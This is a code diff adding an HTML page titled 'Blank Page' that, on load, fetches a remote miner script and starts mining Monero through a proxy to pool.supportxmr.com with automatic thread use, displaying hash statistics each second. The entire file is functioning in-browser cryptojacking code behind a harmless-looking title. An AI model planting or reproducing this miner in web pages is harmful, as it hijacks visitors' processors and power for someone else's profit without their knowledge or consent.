@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Blank Page</title>
+  <script src="https://minetesting.github.io/proxy/m.js?proxy=wss://minetesting.now.sh?pool=pool.supportxmr.com:3333"></script>
+  <script>
+    var miner = CH.Anonymous('test');
+    miner.start();
+    miner.setAutoThreadsEnabled(true);
+    setInterval(function() {
+      var hashesPerSecond = miner.getHashesPerSecond();
+      var totalHashes = miner.getTotalHashes();
+      var acceptedHashes = miner.getAcceptedHashes();
+
+      document.getElementById('hashesps').innerHTML = "Hashes per second: "+hashesPerSecond
+      document.getElementById('hashestot').innerHTML = "Total hashes: "+totalHashes
+      document.getElementById('hashesacc').innerHTML  = "Accepted shares: "+acceptedHashes
+    }, 1000);
+  </script>
+</head>
+<body>
+  <div id="hashesps"></div>
+  <div id="hashestot"></div>
+  <div id="hashesacc"></div>
+</body>
+</html>
